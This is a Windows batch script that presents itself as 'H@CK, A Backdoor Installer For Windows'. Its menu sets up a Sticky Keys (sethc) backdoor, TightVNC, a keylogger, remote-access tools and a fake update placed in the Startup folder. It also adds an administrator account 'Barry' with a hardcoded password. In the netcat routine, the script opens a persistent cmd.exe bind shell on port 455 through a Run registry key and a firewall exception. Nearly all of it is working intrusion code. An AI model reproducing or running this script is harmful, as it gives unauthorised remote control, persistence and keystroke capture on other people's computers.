@echo off
if "%Rebooted%"=="yes" (set Rebooted=no) else (set Rebooted=yes&call start "" "%~0"&exit /b)
color 0e
pushd "%~dp0"
:Loop
pause
color 0b
cls
echo.
echo €ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
echo €              Welcome To H@CK, A Backdoor Installer For Windows              €
echo €‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
echo €ﬂﬂﬂ€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬂﬂﬂﬂ
echo € 1 € Install Sethc Backdoor        € Status :
echo € 2 € Install TightVNC Backdoor     € Status :
echo € 3 € Install Netcat Backdoor       € Status :
echo € 4 € Install Keylogger             € Status :
echo € 5 € Install Hamachi LogMeIn       € Status :
echo €‹‹‹€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
echo €ﬂﬂﬂ€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
echo € 6 € Enable  Fake Update           € Status :
echo € 7 € Enable  Admin Account 'Barry' € Status :
echo € 8 € Start New CMD Process         € Status :
echo €‹‹‹€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
echo.
echo €
title Loading Status...
((comp X.exe C:\windows\system32\sethc.exe <nul)|findstr OK&&set BackdoorInstalled=Installed||set BackdoorInstalled=Uninstalled)>nul 2>&1
if exist "C:\Program Files (x86)\TightVNC" (set VNCInstalled=Installed) else (if exist "C:\Program Files\TightVNC" (set VNCInstalled=Installed) else (set VNCInstalled=Uninstalled))
(net users|findstr "Barry"&&Set BarryInstalled=Installed||Set BarryInstalled=Uninstalled) >nul 2>&1
if "%BarryInstalled%"=="Installed" (set "whatt=Disable") else (set "whatt=Enable ")
net file>nul 2>&1&&set "adminPer=Admin Access"||set "adminPer=Normal Access"
if exist "C:\Program Files (x86)\FK_Monitor" (set KeyloggerInstalled=Installed) else (if exist "C:\Program Files\FK_Monitor" (set KeyloggerInstalled=Installed) else (set KeyloggerInstalled=Uninstalled))
if exist "C:\Program Files (x86)\LogMeIn" (set LogMeInInstalled=Installed) else (if exist "C:\Program Files\LogMeIn" (set LogMeInInstalled=Installed) else (set LogMeInInstalled=Uninstalled))
if exist "C:\windows\system32\nc.exe" (set NetcatInstalled=Installed) else (set NetcatInstalled=Uninstalled)
if exist "%userprofile%\downloads\accessibility.exe" (set FakeUpdateInstalled=Installed&set what2=Disable) else (set FakeUpdateInstalled=Uninstalled&set "what2=Enable ")
cls
color 0e
title H@CK - Main Menu
echo.
echo €ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
echo €              Welcome To H@CK, A Backdoor Installer For Windows              €
echo €‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
echo €ﬂﬂﬂ€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬂﬂﬂﬂ
echo € 1 € Install Sethc Backdoor        € Status : %BackdoorInstalled%
echo € 2 € Install TightVNC Backdoor     € Status : %VNCInstalled%
echo € 3 € Install Netcat Backdoor       € Status : %NetcatInstalled%
echo € 4 € Install Keylogger             € Status : %KeyloggerInstalled%
echo € 5 € Install Hamachi LogMeIn       € Status : %LogMeInInstalled%
echo €‹‹‹€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
echo €ﬂﬂﬂ€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ€
echo € 6 € %what2% Fake Update           € Status : %FakeUpdateInstalled%
echo € 7 € %whatt% Admin Account 'Barry' € Status : %BarryInstalled%
echo € 8 € Start New CMD Process         € Status : %adminper%
echo €‹‹‹€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹€
echo.
set "Ask="
set /p Ask="€ "
if "%Ask%"=="1" call start "" X.exe I
if "%Ask%"=="2" "Hacking\TightVNC Setup 32-bit.msi"
if "%Ask%"=="3" call :Install_Netcat
if "%Ask%"=="4" "Hacking\Keylogger.exe"
if "%Ask%"=="5" "Hacking\Hamachi.msi"
if "%Ask%"=="6" goto :InstallFakeUpdate
if "%Ask%"=="7" call :AdminBarry
if "%Ask%"=="8" call start "" cmd
goto :Loop
:InstallFakeUpdate
if "%FakeUpdateInstalled%"=="Installed" goto :UninstallFake
pushd "Hacking\FakeUpdate\"
call install.bat
popd
goto :loop
:UninstallFake
taskkill /f /t /im Start.exe
attrib -h -s "%userprofile%\Downloads\accessibility.exe"
attrib -h -s "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.exe"
del /F "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\start.exe"
del /F "%userprofile%\Downloads\accessibility.exe"
goto :loop
:AdminBarry
if "%BarryInstalled%"=="Installed" (goto Unin)
net user Barry barryislife /add
net localgroup Administrators Barry /add
goto :EOF
:Unin
net user Barry /delete
goto :EOF
:Install_Netcat
if "%NetcatInstalled%"=="Installed" goto Uninstall_Netcat
copy "Hacking\nc.exe" "C:\windows\system32\nc.exe"
reg add HKLM\software\microsoft\windows\currentversion\run /v nc /t REG_SZ /d "C:\Windows\system32\nc.exe -Ldp 455 -e cmd.exe"
netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL
call start "" "C:\Windows\system32\nc.exe" -Ldp 455 -e cmd.exe
goto :eof
:Uninstall_Netcat
taskkill /f /im nc.exe
del /F C:\windows\system32\nc.exe >nul 2>&1
reg delete HKLM\software\microsoft\windows\currentversion\run /v nc /f
goto :eof